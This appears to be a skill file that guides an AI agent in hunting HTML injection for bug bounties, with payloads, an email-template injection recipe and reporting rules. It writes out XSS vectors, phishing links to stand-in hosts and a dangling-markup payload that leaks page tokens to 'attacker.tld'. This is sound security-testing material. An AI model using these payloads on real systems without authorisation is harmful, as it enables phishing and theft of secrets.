---
name: hunt-html-injection
description: "Hunt HTML Injection — user-supplied input is rendered as raw HTML in the response without sanitisation, allowing an attacker to inject arbitrary HTML tags (but not necessarily JavaScript). Lower severity than XSS but enables phishing, UI manipulation, and credential harvesting via injected forms. Use when testing text-display surfaces (search results, profile fields, comments, error messages, feedback forms). For markup that executes JavaScript, escalate to hunt-xss."
sources: hackerone_public, public_research
report_count: 6
---

## Working principles

- Report only bugs that are actually proven, with evidence and reproduction steps. Negative tests stay in internal notes and are never submitted. Distinguish potential vs proven vs reportable.
- Validate each hypothesis with an explicit verdict: CONFIRMED, FALSIFIED, or INCONCLUSIVE. Do not conclude "0 confirmed" prematurely — re-evaluate for missed gaps (business logic, state transitions, value limits, feature interactions) and check state changes and side effects (HTTP 200 is not success; an error is not safety).
- Test only with the user's own accounts on free tiers. Never spend capital or pay for testing. No DoS, spam, high-volume automated scanning, social engineering, or other people's data. No bypassing gates by evasion.
- Never submit anything (a report, a grade, a mainnet/testnet submission) without the user's explicit confirmation for that specific submit. Never send a report twice. Never reply to a vendor without approval.
- Follow the program's "How to report" structure (Description, Potential Impact, Evidence, Steps to Reproduce). Vendor emails open with a greeting + short intro, tidy formatting, never raw markdown as the email body.
- Communicate terse, exact, and path-first. Indonesian for conversation, English for technical detail, code, identifiers, and error strings.

> **Extra attack variants** (OpenEMR + PHP-core advisories — see §B): `skills/security/exploit-cookbook/references/openemr-php-advisory-techniques.md`


## What is HTML Injection

HTML Injection occurs when user input is inserted into a page's HTML without escaping, so injected tags are rendered by the browser as markup rather than displayed as literal text. Unlike XSS, the injected content does not require JavaScript execution — injecting `<b>`, `<h1>`, `<a>`, `<img>`, or `<form>` tags is sufficient.

**To PROVE impact unambiguously, escalate to an active vector carrying a unique numeric canary** — e.g. `"><img src=x onerror=alert(91234)>` or `<svg onload=alert(91234)>`. A distinctive 4+ digit number (not `alert(1)`) distinguishes YOUR reflected injection from the example payloads practice pages embed in their own hint text. Proof = the raw, unescaped vector with your canary appears in the response.

**Impact:**
- Phishing via injected `<form>` or `<a href="attacker.com">` tags
- UI defacement — `<h1>HACKED</h1>` renders visually on the page
- Credential harvesting via injected login forms
- Redirect via `<meta http-equiv="refresh">`
- Stepping stone to XSS (may be blocked by WAF on `<script>` but not `<img onerror>`)
- **Dangling-markup exfiltration** — even with `<script>` and event handlers filtered, an *unterminated* tag can capture page content that follows it. Inject `<img src='//attacker.tld/log?html=` (no closing quote/`>`); the browser treats everything up to the next `'` as the URL, leaking any CSRF token, secret, or PII rendered after your injection point to your server. Works where full XSS is blocked but raw `<` is reflected.
- **Email/notification-context injection** — a field reflected unescaped into a transactional email (signup confirmation, admin alert, support-chat transcript) renders injected `<a>`/`<img>`/dangling markup in the *recipient's* inbox — an audience the web UI can't reach, and often the only place HTML is rendered unfiltered. Inject into name/subject/comment, then read the raw email source. Disclosed class: <https://hackerone.com/reports/1935628>, <https://hackerone.com/reports/3556892>.

## Attack Surface

Any input that is reflected or stored and then displayed in an HTML context:
- Search boxes (`?q=`)
- Comments, feedback, reviews
- Profile fields (name, bio, username)
- Error messages (`?error=`, `?message=`)
- Subject / body of contact forms
- Admin-visible fields (ticket titles, usernames in logs)

## Email-template injection — the out-of-band sink (verified 2026-09)

The classic hunt only looks at the *reflected response*. The highest-yield variant of this class is
**server-rendered transactional email**, where you never see the sink in the browser — you have to
receive the mail. Transactional templates (invite member, member added, role changed, password
reset, receipts, "X shared Y with you") interpolate stored user-controlled strings with raw HTML.

**Recipe**
1. Have a mailbox you control for the target (disposable inbox, or a plus-alias of your own address
   — `you+tag@domain` usually lands in the same inbox).
2. Put the payload into a **stored** field the template interpolates — member/invitee full name,
   display name, company name, custom-field label, project/list name. Free-text "name" fields on
   invite/member flows are the sweet spot.
3. Trigger the email to your own address, then read the **raw HTML part** (IMAP `msg.html`, or
   "show original" in the client). Grep it for your canary, not for your payload string — the ESP
   may rewrite URLs (Mandrill click-tracking rewrote `https://evil.example/v` into
   `mandrillapp.com/track/click/…` while *preserving the destination*, which actually strengthens
   the PoC).
4. Payload shapes: `<b>CANARY</b>` for the minimal proof; `<a href=https://evil.example/v>Verify</a>`
   (unquoted attr) when a name field rejects quotes or splits on spaces. If the app splits full
   names on the first space into first/last, a no-space payload survives intact.

**Root-cause accelerator — compare sibling interpolations in the SAME email.** If the inviter's name
is escaped (`&lt;b&gt;INJ&lt;/b&gt; X has invited you…`) but the invitee's name renders raw
(`<strong>Hi <a href=…>Verify</a>,</strong>`), the bug is a single missing escape, not "by design" —
and that contrast is the single most persuasive piece of evidence you can hand a triager. Look for it.

**Make it repeatable.** The payload is stored on the record, so re-sending the invitation
(`POST /users/invitation {email}` or the UI "resend" button) re-delivers the malicious email on
demand. Demonstrate the re-render — it converts a one-shot into an attacker-repeatable primitive.

**Controls to run before claiming**
- Same value in the app UI: escaped by the frontend framework → the bug is email-template-specific
  (say so; it prevents an "it's just React escaping" rebuttal).
- Is the from-domain, SPF and DKIM still the brand's? Yes → it is a *brand-phishing* primitive, NOT
  arbitrary sender spoofing. Never claim ATO / XSS / arbitrary `From`.

**Honest severity.** Baseline P4, with a P3 request only when (a) the program itself lists email
template injection as a focus/top class, (b) the recipient is attacker-chosen (third party, not
self-sent), and (c) the payload renders as a real styled link. Never inflate past that: no data is
compromised by an HTML-injected email.

**Evidence to keep:** raw HTML of the received mail + the API/UI request that seeded the field +
the sibling-field contrast snippet. Screenshots of the rendered mail are secondary to raw source.

## Autonomous Testing Priority

**Inject a recognisable HTML tag with a unique canary string. Unescaped angle brackets in the response = confirmed injection.**

**Pattern 1 — Basic HTML tag injection:**
```
<b>CANARY</b>
"><b>CANARY</b>
```
Use a unique string as CANARY (something distinct to this test run). **Proof:** the response contains `<b>CANARY` with literal `<` angle brackets — not `&lt;b&gt;CANARY`. A properly encoded app would escape `<` to `&lt;`.

**Try multiple tag types when `<b>` is filtered:**
- `<h1>CANARY</h1>` — heading tag (often less filtered)
- `<img src=x onerror=CANARY>` — attribute context
- `<a href="https://attacker.com">click</a>` — link injection (phishing proof)

**For stored injection:** inject into the storage endpoint, then GET the page where the value is displayed and check for unescaped tags.

**Escalate immediately:** if `<b>` injection works, try `<script>alert(1)</script>` — the same unsanitised input may allow full XSS.

## Proof

Confirmed when your injected tag appears in the response body with literal `<` angle brackets (not HTML-encoded). A safe app renders `&lt;b&gt;CANARY&lt;/b&gt;`; a vulnerable app renders `<b>CANARY</b>`.

## Distinguishing HTML Injection from XSS

- HTML injection: `<b>text</b>` renders as **text** in the browser — no JS execution needed.
- XSS: `<script>alert(1)</script>` executes JavaScript.

Some WAFs block `<script>` but pass `<b>` or `<img>` — start with non-script tags, then escalate.